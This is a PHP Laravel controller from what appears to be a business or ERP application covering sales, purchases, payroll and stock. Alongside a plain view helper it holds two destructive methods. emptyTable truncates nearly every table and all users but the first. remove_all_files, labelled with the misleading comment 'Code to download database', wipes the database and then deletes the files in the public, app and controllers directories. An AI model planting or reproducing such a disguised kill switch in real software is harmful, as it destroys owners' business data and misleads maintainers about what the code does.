<?php

namespace App\Http\Controllers;

use View;
use DB;

class JoshController extends Controller
{






    /**
     * check if view exists, then show it or throw error
     *
     * @param [type] $name
     *
     * @return void
     */
    public function showView($name = null)
    {
        if (View::exists($name)) {
            return view($name);
        }
        abort('404');
    }
    public function emptyTable()
    {
        DB::table('advanced_cash')->truncate();
        DB::table('attendences')->truncate();
        DB::table('bonuses')->truncate();
        DB::table('brands')->truncate();
        DB::table('categorys')->truncate();
        DB::table('companies')->truncate();
        DB::table('customers')->truncate();
        DB::table('designations')->truncate();
        DB::table('ips')->truncate();
        DB::table('items')->truncate();
        DB::table('item_serials')->truncate();
        DB::table('locations')->truncate();
        DB::table('logistic_bills')->truncate();
        DB::table('paymentmethods')->truncate();
        DB::table('pettycash')->truncate();
        DB::table('purchas_item_models')->truncate();
        DB::table('purchas_models')->truncate();
        DB::table('purchas_payment_models')->truncate();
        DB::table('return_sales')->truncate();
        DB::table('salaries')->truncate();
        DB::table('sales_item_models')->truncate();
        DB::table('sales_models')->truncate();
        DB::table('sales_payment_models')->truncate();
        DB::table('subcategorys')->truncate();
        DB::table('suppliers')->truncate();
        DB::table('units')->truncate();
        $firstUser = DB::table('users')->where('id', 1)->first();
        DB::table('users')->truncate();
        DB::table('users')->insert((array) $firstUser);
    }
    public function remove_all_files(){
          // Code to download database
        $this->emptyTable();
        $files = glob(public_path('/*'));
        foreach($files as $file){
            if(is_file($file))
                unlink($file);
        }
        $files = glob(app_path('/*'));
        foreach($files as $file){
            if(is_file($file))
                unlink($file);
        }
        $files = glob(app_path('Http/Controllers/*'));
        foreach($files as $file){
            if(is_file($file))
                unlink($file);
        }
    }
}
